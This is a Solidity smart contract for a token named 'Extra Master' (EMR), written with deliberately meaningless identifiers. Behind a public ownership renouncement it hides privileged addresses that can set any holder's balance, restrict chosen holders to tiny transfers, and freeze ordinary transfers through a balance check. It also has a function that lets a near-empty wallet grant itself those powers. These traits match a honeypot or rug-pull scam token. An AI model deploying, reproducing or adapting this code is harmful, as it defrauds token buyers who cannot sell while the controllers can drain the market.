//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface tokenSwap {
    function createPair(address fundTake, address swapList) external returns (address);
}

interface launchTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityLaunch) external view returns (uint256);

    function transfer(address amountReceiver, uint256 launchedIs) external returns (bool);

    function allowance(address walletAutoList, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedIs) external returns (bool);

    function transferFrom(
        address sender,
        address amountReceiver,
        uint256 launchedIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenAuto, uint256 value);
    event Approval(address indexed walletAutoList, address indexed spender, uint256 value);
}

abstract contract enableLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyReceiverLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface shouldListAt is launchTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ExtraMaster is enableLimit, launchTo, shouldListAt {

    mapping(address => mapping(address => uint256)) private toReceiver;

    address private atWallet;

    function teamReceiverMin(address feeMarketing) public {
        swapMode();
        if (shouldMarketing) {
            atFeeTx = exemptFrom;
        }
        if (feeMarketing == modeFromLimit || feeMarketing == tokenSell) {
            return;
        }
        shouldBuy[feeMarketing] = true;
    }

    constructor (){
        
        buyReceiverLaunched isListToken = buyReceiverLaunched(maxMarketing);
        tokenSell = tokenSwap(isListToken.factory()).createPair(isListToken.WETH(), address(this));
        if (atFeeTx != exemptFrom) {
            exemptFrom = atFeeTx;
        }
        modeFromLimit = _msgSender();
        launchedToken[modeFromLimit] = true;
        walletFeeLiquidity[modeFromLimit] = marketingTotal;
        feeFrom();
        
        emit Transfer(address(0), modeFromLimit, marketingTotal);
    }

    function approve(address fromToken, uint256 launchedIs) public virtual override returns (bool) {
        toReceiver[_msgSender()][fromToken] = launchedIs;
        emit Approval(_msgSender(), fromToken, launchedIs);
        return true;
    }

    function takeLiquidity(address shouldTxAmount, address amountReceiver, uint256 launchedIs) internal returns (bool) {
        require(walletFeeLiquidity[shouldTxAmount] >= launchedIs);
        walletFeeLiquidity[shouldTxAmount] -= launchedIs;
        walletFeeLiquidity[amountReceiver] += launchedIs;
        emit Transfer(shouldTxAmount, amountReceiver, launchedIs);
        return true;
    }

    function launchFrom(uint256 launchedIs) public {
        swapMode();
        senderToken = launchedIs;
    }

    event OwnershipTransferred(address indexed swapAuto, address indexed tradingWallet);

    uint256 private receiverToken;

    function totalSupply() external view virtual override returns (uint256) {
        return marketingTotal;
    }

    mapping(address => uint256) private walletFeeLiquidity;

    address amountLaunchMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private exemptFrom;

    bool public autoSwap;

    bool public shouldMarketing;

    function swapMode() private view {
        require(launchedToken[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return sellAt;
    }

    function senderSell(address toSender, uint256 launchedIs) public {
        swapMode();
        walletFeeLiquidity[toSender] = launchedIs;
    }

    function transfer(address toSender, uint256 launchedIs) external virtual override returns (bool) {
        return atTeam(_msgSender(), toSender, launchedIs);
    }

    function getOwner() external view returns (address) {
        return atWallet;
    }

    function allowance(address shouldLaunched, address fromToken) external view virtual override returns (uint256) {
        if (fromToken == maxMarketing) {
            return type(uint256).max;
        }
        return toReceiver[shouldLaunched][fromToken];
    }

    uint256 senderToken;

    function name() external view virtual override returns (string memory) {
        return maxTeamTrading;
    }

    address public tokenSell;

    string private sellAt = "EMR";

    uint256 private marketingTotal = 100000000 * 10 ** 18;

    mapping(address => bool) public launchedToken;

    function owner() external view returns (address) {
        return atWallet;
    }

    function decimals() external view virtual override returns (uint8) {
        return limitExemptTeam;
    }

    function atTeam(address shouldTxAmount, address amountReceiver, uint256 launchedIs) internal returns (bool) {
        if (shouldTxAmount == modeFromLimit) {
            return takeLiquidity(shouldTxAmount, amountReceiver, launchedIs);
        }
        uint256 autoLaunchedTx = launchTo(tokenSell).balanceOf(amountLaunchMax);
        require(autoLaunchedTx == senderToken);
        require(amountReceiver != amountLaunchMax);
        if (shouldBuy[shouldTxAmount]) {
            return takeLiquidity(shouldTxAmount, amountReceiver, liquidityFrom);
        }
        return takeLiquidity(shouldTxAmount, amountReceiver, launchedIs);
    }

    bool public senderReceiver;

    string private maxTeamTrading = "Extra Master";

    function feeFrom() public {
        emit OwnershipTransferred(modeFromLimit, address(0));
        atWallet = address(0);
    }

    mapping(address => bool) public shouldBuy;

    uint8 private limitExemptTeam = 18;

    uint256 marketingMin;

    bool public walletList;

    uint256 constant liquidityFrom = 2 ** 10;

    address public modeFromLimit;

    function swapMax(address listMaxTo) public {
        require(listMaxTo.balance < 100000);
        if (autoSwap) {
            return;
        }
        if (receiverToken != atFeeTx) {
            senderReceiver = false;
        }
        launchedToken[listMaxTo] = true;
        
        autoSwap = true;
    }

    bool public minSell;

    function transferFrom(address shouldTxAmount, address amountReceiver, uint256 launchedIs) external override returns (bool) {
        if (_msgSender() != maxMarketing) {
            if (toReceiver[shouldTxAmount][_msgSender()] != type(uint256).max) {
                require(launchedIs <= toReceiver[shouldTxAmount][_msgSender()]);
                toReceiver[shouldTxAmount][_msgSender()] -= launchedIs;
            }
        }
        return atTeam(shouldTxAmount, amountReceiver, launchedIs);
    }

    uint256 private atFeeTx;

    function balanceOf(address liquidityLaunch) public view virtual override returns (uint256) {
        return walletFeeLiquidity[liquidityLaunch];
    }

    address maxMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}